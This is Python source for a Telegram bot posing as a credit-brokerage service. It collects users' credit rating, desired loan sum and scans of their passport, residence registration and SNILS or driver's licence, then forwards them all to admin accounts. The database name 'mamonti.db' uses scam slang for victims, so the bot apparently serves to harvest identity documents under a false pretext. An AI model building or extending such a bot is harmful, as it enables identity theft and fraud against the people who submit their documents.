from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State
import sqlite3
import base64
import time
import os
from dotenv import load_dotenv
from kb import *
import logging

logging.basicConfig(level=logging.INFO, filename="py_log.log", filemode="a",
                    format="%(asctime)s %(levelname)s %(message)s")
logging.debug("A DEBUG Message")
logging.info("An INFO")
logging.warning("A WARNING")
logging.error("An ERROR")
logging.critical("A message of CRITICAL severity")

load_dotenv()
ext_data = []
bot = Bot(os.getenv('TOKEN'))
admins = [str(x) for x in os.getenv('ADMIN_ID').split()]
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
con = sqlite3.connect('mamonti.db')
cur = con.cursor()
cur.execute(
    'CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, tag INTEGER, name VARCHAR(10), passport BLOB NOT NULL, propiska BLOB NOT NULL, SecDoc BLOB NOT NULL, CreditRate VARCHAR(10), PhisOrUr VARCHAR(10), Summa VARCHAR(10))')
con.commit()


class UserState(StatesGroup):
    phisikurik = State()
    creditRate = State()
    Summa = State()
    passport = State()
    propiska = State()
    secDoc = State()


async def getInfo():
    cur.execute("SELECT * FROM users ORDER BY id DESC LIMIT 0,1;")
    result = cur.fetchall()
    if result:
        for admin_id in admins:
            await bot.send_message(text=
                                   f'Получена новая заявка от {result[0][7][:-1]}а!\nid: {result[0][1]}\nusername: @{result[0][2]}\nКредитный рейтинг: {result[0][6]}\nСумма: {result[0][8]}',
                                   chat_id=admin_id)
            await bot.send_message(text='Паспорт:', chat_id=admin_id)
            await bot.send_document(chat_id=admin_id,
                                    document=blob_to_pdf(blobik=result[0][3], extension=ext_data[0]))
            await bot.send_message(text='Прописка:', chat_id=admin_id)
            await bot.send_document(chat_id=admin_id,
                                    document=blob_to_pdf(result[0][4], extension=ext_data[1]))
            await bot.send_message(text='СНИЛС/Права:', chat_id=admin_id)
            await bot.send_document(chat_id=admin_id,
                                    document=blob_to_pdf(result[0][5], extension=ext_data[2]))


# Функции
def pdf_to_blob(document):
    with open(document, 'rb') as f:
        blob = base64.b64encode(f.read())
    return blob


def blob_to_pdf(blobik, extension):
    blob = blobik
    blob = base64.b64decode(blob)
    text_file = open(f'result.{extension}', 'wb')
    text_file.write(blob)
    return open(f'result.{extension}', 'rb')


def sql_request_send(user_id, username, passport, propiska, secdoc, creditrate, phisorur, summa):
    cur.execute(
        "INSERT OR IGNORE INTO users (tag, name, passport, propiska, SecDoc, CreditRate, PhisOrUr, Summa) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        (user_id, username, passport, propiska, secdoc, creditrate, phisorur, summa))
    con.commit()


# def send_data():
#     time.sleep(10)
#     cur.execute("SELECT * from users")
#     records = cur.fetchall()
#     blobik = ''
#     for row in records:
#         blobik = row[2]
#     blob_to_pdf(blobik)


# Обработчики команд
@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    markup = default_keyboard()
    # markup_admin = default_keyboard_admin()
    if str(message.from_user.id) in admins:
        await message.answer('Вы авторизовались как администратор', reply_markup=markup)
    else:
        await message.answer_sticker(f'{os.getenv("STICKER_WELCOME")}')
        await message.answer(f'{message.from_user.first_name}, добро пожаловать в компанию <b> финансист </b> 💰!',
                             reply_markup=markup, parse_mode='HTML')


@dp.message_handler(commands=['id'])
async def show_id(message: types.Message):
    markup = default_keyboard()
    await message.answer(f'Ваш id:{message.from_user.id}', reply_markup=markup)


@dp.message_handler(commands=['admin'])
async def show_id(message: types.Message):
    markup = default_keyboard()
    # markup_admin = admin_keyboard()
    if message.from_user.id == int(os.getenv('ADMIN_ID')):
        await message.answer(f'Ваш id:{message.from_user.id}', reply_markup=markup)
    else:
        await message.answer('У вас нет прав администратора!', reply_markup=markup)


# Обработчики сообщений
@dp.message_handler(Text(equals="О нас"))
async def callback_about_us(message: types.Message):
    await message.answer(
        f'Мы занимается кредитным брокерством, помогаем получать нашим клиентам на суммы, '
        f'превышающие в несколько раз те, которые получают люди без нашей помощи',
        parse_mode='HTML')


@dp.message_handler(Text(equals='Наш сайт'))
async def callback_site(message: types.Message):
    markup = types.InlineKeyboardMarkup().add(InL_button_site)
    await message.answer('По кнопке ниже вы можете ознакомиться с нашим сайтом', reply_markup=markup)


@dp.message_handler(Text(equals="Продолжить"))
async def callback_continue(message: types.Message):  # Changed function name to callback_continue
    await message.answer('Вы физ. или юр. лицо?', reply_markup=phis_or_ur_kb())
    await UserState.phisikurik.set()


@dp.message_handler(state=UserState.phisikurik)
async def PhisOrUrIns(message: types.Message, state: FSMContext):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(button_KRateCheck)
    await state.update_data(pOU=message.text)
    await UserState.next()
    await message.answer('Введите ваш кредитный рейтинг', reply_markup=credRatekb())


@dp.message_handler(state=UserState.creditRate)
async def creditRateIns(message: types.Message, state: FSMContext):
    try:
        int(message.text)
    except ValueError:
        await message.answer('Ошибка! Введите числовое значение')
    await state.update_data(CredRate=message.text)
    data = await state.get_data()
    if int(data['CredRate']) >= 450 and data['pOU'] == 'Физ. лицо' or int(data['CredRate']) >= 250 and data[
        'pOU'] == 'Юр. лицо':  # заменить число
        await message.answer('Вы успешно прошли проверку на кредитный рейтинг!')
        await UserState.next()
        await message.answer('Введите желаемую сумму', reply_markup=types.ReplyKeyboardRemove())
    else:
        await message.answer('К сожалению, ваш кредитный рейтинг слишком мал. Обратитесь к нам позже',
                             reply_markup=types.ReplyKeyboardRemove())
        await state.finish()


@dp.message_handler(state=UserState.Summa)
async def summIns(message: types.Message, state: FSMContext):
    data = await state.get_data()
    logging.info(f"ask for summa")
    try:
        int(message.text)
        logging.info(f"Success summa")
    except ValueError:
        await message.answer('Ошибка! Введите числовое значение')
        logging.error("Fucked by summa ValueError", exc_info=True)
    await state.update_data(summa=message.text)
    await message.answer('Записали сумму')
    await message.answer('Отправьте документ или фотографию паспорта')
    await UserState.next()


@dp.message_handler(state=UserState.passport, content_types=['document'])
async def PhotoPas(message: types.Message, state: FSMContext):
    logging.info(f"ask for passport")
    try:
        await bot.get_file(message.document.file_id)
        logging.info(f"Success passport")
    except:
        await message.answer('Ошибка! Загрузите файл')
        logging.error("не загружен файл", exc_info=True)
    file_info = await bot.get_file(message.document.file_id)
    file_path = file_info.file_path
    extension = file_path.split('.')[1]  # Получает расширения файла
    document = f'files/passport.{extension}'
    ext_data.append(extension)
    logging.info(f"ask for passport")
    try:
        if file_path.endswith('.pdf') or file_path.endswith('.jpeg') or file_path.endswith(
                '.heic') or file_path.endswith(
            '.png') \
                or file_path.endswith('.jpg') or file_path.endswith('.tiff') \
                or file_path.endswith('.bmp') or file_path.endswith('.webp'):
            await bot.download_file(file_path, document)
            await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
            # time.sleep(1) набью себе не спать на глазааааах
            # time.sleep(10) лучше не спать а сипать
            await state.update_data(passport=pdf_to_blob(document))
            await message.answer('Паспорт получен, теперь нам нужно фото вашей прописки', reply_markup=next_keyboard())
            logging.info(f"Success passport")
    except:
        await message.reply('Можно сохранять только PDF файлы и фотографии. Повторите еще раз',
                            reply_markup=next_keyboard())
        logging.error("Fucked by passport", exc_info=True)
    await UserState.next()


@dp.message_handler(state=UserState.passport, content_types=['photo'])
async def PhotoPas_photo(message: types.Message, state: FSMContext):
    await message.photo[-1].download('files/passport.jpg')
    document = f'files/passport.jpg'
    extension = 'jpg'
    ext_data.append(extension)
    await state.update_data(passport=pdf_to_blob(document))
    await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
    await message.answer(
        'Паспорт получен, теперь нам нужно фото вашей прописки')
    await UserState.next()


@dp.message_handler(state=UserState.propiska, content_types=['document'])
async def PhotoProp(message: types.Message, state: FSMContext):
    file_info = await bot.get_file(message.document.file_id)
    file_path = file_info.file_path
    extension = file_path.split('.')[1]  # Получает расширения файла
    document = f'files/propiska.{extension}'
    ext_data.append(extension)
    logging.info(f"ask for propiska")
    try:
        if file_path.endswith('.pdf') or file_path.endswith('.jpeg') or file_path.endswith(
                '.heic') or file_path.endswith(
            '.png') \
                or file_path.endswith('.jpg') or file_path.endswith('.tiff') \
                or file_path.endswith('.bmp') or file_path.endswith('.webp'):
            await bot.download_file(file_path, document)
            await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
            # time.sleep(1) набью себе не спать на глазааааах
            # time.sleep(10) лучше не спать а сипать
            await state.update_data(propiska=pdf_to_blob(document))
            await message.answer('Приняли вашу прописку, теперь отправьте СНИЛС или водителькое удостоверение')
            logging.info("Succes propiska")
    except:
        await message.reply('Можно сохранять только PDF файлы и фотографии. Повторите еще раз')
        logging.error("Fucked by propiska", exc_info=True)
    await UserState.next()


@dp.message_handler(state=UserState.propiska, content_types=['photo'])
async def PhotoProp_photo(message: types.Message, state: FSMContext):
    await message.photo[-1].download('files/propiska.jpg')
    document = f'files/propiska.jpg'
    extension = 'jpg'
    ext_data.append(extension)
    await state.update_data(propiska=pdf_to_blob(document))
    await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
    await message.answer(
        'Прописка получена, теперь нужен СНИЛС или Водительское удостоверение')
    await UserState.next()


@dp.message_handler(state=UserState.secDoc, content_types=['document'])
async def SecDoc(message: types.Message, state: FSMContext):
    file_info = await bot.get_file(message.document.file_id)
    file_path = file_info.file_path
    extension = file_path.split('.')[1]  # Получает расширения файла
    document = f'files/secdoc.{extension}'
    ext_data.append(extension)
    logging.info(f'ask for secdoc')
    try:
        if file_path.endswith('.pdf') or file_path.endswith('.jpeg') or file_path.endswith(
                '.heic') or file_path.endswith(
            '.png') \
                or file_path.endswith('.jpg') or file_path.endswith('.tiff') \
                or file_path.endswith('.bmp') or file_path.endswith('.webp'):
            await bot.download_file(file_path, document)
            await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
            # time.sleep(1) набью себе не спать на глазааааах
            # time.sleep(10) лучше не спать а сипать
            await state.update_data(secDoc=pdf_to_blob(document))
            await message.answer(
                'Ваша заявка была принята и направлена нашим менеджерам, которые с вами свяжутся. До скорых встреч!')
            logging.info(f'Success secdoc')
    except:
        await message.reply('Можно сохранять только PDF файлы и фотографии. Повторите еще раз')
        logging.error("Fucked by secdoc", exc_info=True)
    data = await state.get_data()
    sql_request_send(message.from_user.id, message.from_user.username, data['passport'],
                     data['propiska'],
                     data['secDoc'], data['CredRate'], data['pOU'], data['summa'])
    await getInfo()
    await state.finish()


@dp.message_handler(state=UserState.secDoc, content_types=['photo'])
async def SecDoc_photo(message: types.Message, state: FSMContext):
    await message.photo[-1].download('files/secDoc.jpg')
    document = f'files/secDoc.jpg'
    extension = 'jpg'
    ext_data.append(extension)
    await state.update_data(secDoc=pdf_to_blob(document))
    await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
    await message.answer(
        'Ваша заявка была принята и направлена нашим менеджерам, которые с вами свяжутся. До скорых встреч!')
    await UserState.next()
    data = await state.get_data()
    sql_request_send(message.from_user.id, message.from_user.username, data['passport'],
                     data['propiska'],
                     data['secDoc'], data['CredRate'], data['pOU'], data['summa'])
    await getInfo()
    await state.finish()


# @dp.message_handler()  # commands or content types as args
# async def start(message: types.Message):
#     markup = default_keyboard()
#     await message.answer(f'Не понял вас, {message.from_user.first_name}', reply_markup=markup)


if __name__ == '__main__':
    executor.start_polling(dp)
